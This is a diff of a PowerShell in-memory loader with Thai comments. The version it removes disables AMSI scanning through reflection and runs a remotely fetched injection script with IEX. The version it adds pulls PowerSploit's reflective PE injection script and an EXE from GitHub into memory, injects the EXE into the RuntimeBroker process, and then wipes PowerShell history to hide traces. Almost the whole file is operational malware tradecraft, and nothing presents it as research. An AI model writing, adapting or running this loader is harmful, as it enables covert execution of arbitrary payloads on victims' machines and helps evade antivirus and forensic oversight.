@@ -1,47 +1,44 @@
-# ===============================================
-# Run GUI EXE from URL + FORCE Keep Window Open
-# ===============================================
+# --- 1. ตั้งค่าเป้าหมาย ---
+$payloadUrl = "https://raw.githubusercontent.com/VortexStore/headhunter/refs/heads/main/WebLoader.exe"
+$loaderUrl = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1"
+$targetName = "RuntimeBroker"
 
-$Url = "https://raw.githubusercontent.com/VortexStore/headhunter/refs/heads/main/WebLoader.exe"
-$Arguments = ""
-
-Write-Host "[+] Downloading EXE from URL..." -ForegroundColor Cyan
-
-$WebClient = New-Object System.Net.WebClient
-$WebClient.Headers.Add("User-Agent", "Mozilla/5.0")
-$PEBytes = $WebClient.DownloadData($Url)
-Write-Host "[+] Downloaded $($PEBytes.Length) bytes" -ForegroundColor Green
-
-# AMSI Bypass
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-
-# Load Loader
-Write-Host "[+] Loading Reflective PE Injection..." -ForegroundColor Yellow
-IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/charnim/Invoke-ReflectivePEInjection.ps1/main/Invoke-ReflectivePEInjection.ps1')
-
-Write-Host "[+] Injecting GUI EXE in memory..." -ForegroundColor Green
-
-try {
-    if ($Arguments) {
-        Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs $Arguments -ForceASLR
-    } else {
-        Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR
-    }
-    
-    Write-Host "[+] GUI Program Launched Successfully!" -ForegroundColor Green
-    Write-Host "The program window should appear soon..." -ForegroundColor Yellow
-
-} catch {
-    Write-Host "[-] Error: $($_.Exception.Message)" -ForegroundColor Red
+# --- 2. ฟังก์ชันทำความสะอาด (Clean Up) ---
+function Cleanup-Traces {
+    Write-Host "[*] Cleaning up history and traces..." -ForegroundColor Magenta
+    $historyPath = (Get-PSReadlineOption).HistorySavePath
+    if (Test-Path $historyPath) { Clear-Content $historyPath }
+    Clear-History
 }
 
-# ================== FORCE KEEP WINDOW OPEN ==================
-Write-Host "`n=========================================" -ForegroundColor Magenta
-Write-Host "     POWERShell WINDOW IS KEPT OPEN" -ForegroundColor Magenta
-Write-Host "=========================================" -ForegroundColor Magenta
-Write-Host "Close this window manually when done." -ForegroundColor Cyan
+try {
+    # --- 3. โหลดสคริปต์ Injection และ Payload เข้า RAM ---
+    Write-Host "[*] Downloading components to memory..." -ForegroundColor Cyan
+    $webClient = New-Object System.Net.WebClient
+    $loaderScript = $webClient.DownloadString($loaderUrl)
+    $exeBytes = $webClient.DownloadData($payloadUrl)
+    
+    # รันสคริปต์ Loader ใน Memory
+    Invoke-Expression $loaderScript
 
-# Strong keep-alive loop (placed right after injection)
-while ($true) {
-    Start-Sleep -Seconds 3
+    # --- 4. หา Process เป้าหมายและทำการ Inject ---
+    $targetProc = Get-Process -Name $targetName -ErrorAction SilentlyContinue | Select-Object -First 1
+    
+    if ($null -ne $targetProc) {
+        Write-Host "[*] Injecting into $($targetName) (PID: $($targetProc.Id))..." -ForegroundColor Green
+        Invoke-ReflectivePEInjection -PEBytes $exeBytes -ProcId $targetProc.Id
+    } else {
+        Write-Host "[!] Target process not found. Running locally in memory..." -ForegroundColor Yellow
+        Invoke-ReflectivePEInjection -PEBytes $exeBytes
+    }
+}
+catch {
+    Write-Host "[!] An error occurred: $_" -ForegroundColor Red
+}
+finally {
+    # --- 5. ลบประวัติและปิดหน้าต่าง ---
+    Cleanup-Traces
+    Write-Host "[+] Task complete. Exiting..." -ForegroundColor Gray
+    Start-Sleep -Seconds 2
+    exit
 }
